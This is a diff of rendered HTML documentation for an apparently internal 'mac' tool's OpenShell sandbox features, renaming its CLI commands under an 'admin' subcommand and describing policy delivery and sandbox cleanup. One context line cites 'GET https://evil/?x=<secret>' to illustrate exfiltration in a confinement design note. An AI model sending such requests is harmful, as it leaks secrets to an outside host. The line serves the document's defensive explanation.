@@ -2286,11 +2286,11 @@ assigned, or whether the runtime is currently deployed. The reconciliation
 command reads the enabled Linux agents from <code>~/.mac/fleets.yaml</code> unless
 <code>--agent</code> is passed explicitly, defaults to dry-run, and preserves existing
 agent resources while setting only <code>resources.openshell_required</code>.</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="go">mac openshell reconcile --target-fleet &lt;fleet&gt;</span>
-<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="go">mac openshell reconcile --target-fleet &lt;fleet&gt; --apply --validated \</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="go">mac admin openshell reconcile --target-fleet &lt;fleet&gt;</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="go">mac admin openshell reconcile --target-fleet &lt;fleet&gt; --apply --validated \</span>
 <a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="go">  --sandbox-id docker-openshell-smoke-$(date +%Y%m%d) \</span>
 <a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="go">  --validation-summary &quot;Docker image smoke and OpenShell sandbox smoke passed&quot;</span>
-<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="go">mac openshell status --agent agent_hub</span>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="go">mac admin openshell status --agent agent_hub</span>
 </code></pre></div>
 <p><code>--validated</code> is required when applying <code>status=active</code>; failed or degraded
 hosts should still be reconciled as required, but reported with
@@ -2387,7 +2387,7 @@ truthful.</p>
 </tbody>
 </table>
 <h2 id="policy-delivery-the-hub-assignment-reaches-the-worker">Policy delivery: the hub assignment reaches the worker<a class="headerlink" href="#policy-delivery-the-hub-assignment-reaches-the-worker" title="Permanent link">&para;</a></h2>
-<p><code>mac openshell policy assign &lt;policy&gt; &lt;agent&gt;</code> used to record intent only. The
+<p><code>mac admin openshell policy assign &lt;policy&gt; &lt;agent&gt;</code> used to record intent only. The
 executor resolved its policy from <code>MAC_OPENSHELL_POLICY</code>,
 <code>~/.mac/openshell-policy.yaml</code>, or the bundled fail-closed default — and
 <code>~/.mac/openshell-policy.yaml</code> was written once at provision time by
@@ -2397,7 +2397,7 @@ via a re-bootstrap.</p>
 executor reads the policy when it creates a sandbox) it pulls
 <code>GET /agents/{id}/openshell/policy</code>, and if the checksum differs from what is on
 disk it installs the text at <code>~/.mac/openshell-policy.yaml</code> via write-then-rename
-at mode <code>0600</code>, then reports convergence so <code>mac openshell policy deploy-status</code>
+at mode <code>0600</code>, then reports convergence so <code>mac admin openshell policy deploy-status</code>
 reflects the host rather than the intent.</p>
 <p>Deliberate properties:</p>
 <ul>
@@ -2520,8 +2520,8 @@ axis, because <code>GET https://evil/?x=&lt;secret&gt;</code> is exfiltration wi
 <li><code>~/.mac/openshell/live-confinement-probe.log</code> ends with
    <code>CONFINEMENT_PROBE_OK</code>; bootstrap will not enable enforcement without it.</li>
 <li>Inspect orphan cleanup before applying it manually:
-   <div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="go">mac openshell sandbox-gc</span>
-<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="go">mac openshell sandbox-gc --apply</span>
+   <div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="go">mac admin openshell sandbox-gc</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="go">mac admin openshell sandbox-gc --apply</span>
 </code></pre></div>
    The default 24-hour grace period protects recent work. New sandboxes are
    labeled with their MAC owner, lifecycle kind, creator PID, and debug-keep
